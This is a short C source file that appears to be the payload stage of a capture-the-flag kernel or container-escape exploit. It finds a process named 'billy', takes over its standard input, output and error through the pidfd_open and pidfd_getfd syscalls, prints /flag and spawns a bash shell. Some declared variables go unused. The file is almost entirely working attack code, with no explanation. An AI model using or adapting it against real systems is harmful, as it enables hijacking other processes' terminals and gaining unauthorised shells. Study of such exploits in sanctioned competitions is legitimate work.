#define _GNU_SOURCE             /* See feature_test_macros(7) */
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <sys/prctl.h>
#define SYS_pidfd_getfd 438
char buf[0x100];
char path[0x100];
int res;
int fd;
int port;
char* ip;
void* job(void* x){
	FILE* fp = popen("pidof billy","r");
	fread(buf,1,0x100,fp);
	fclose(fp);
	int pid = strtoull(buf,0,10);
	sprintf(path,"/proc/%d/ns/net",pid);
	int pfd = syscall(SYS_pidfd_open,pid,0);
	int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
	int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
	int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
	dup2(stdinfd,0);
	dup2(stdoutfd,1);
	dup2(stderrfd,2);
	/* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
	system("cat /flag");
	execlp("bash","bash",NULL);

}
int main(int argc,char** argv){	
	job(0);


}
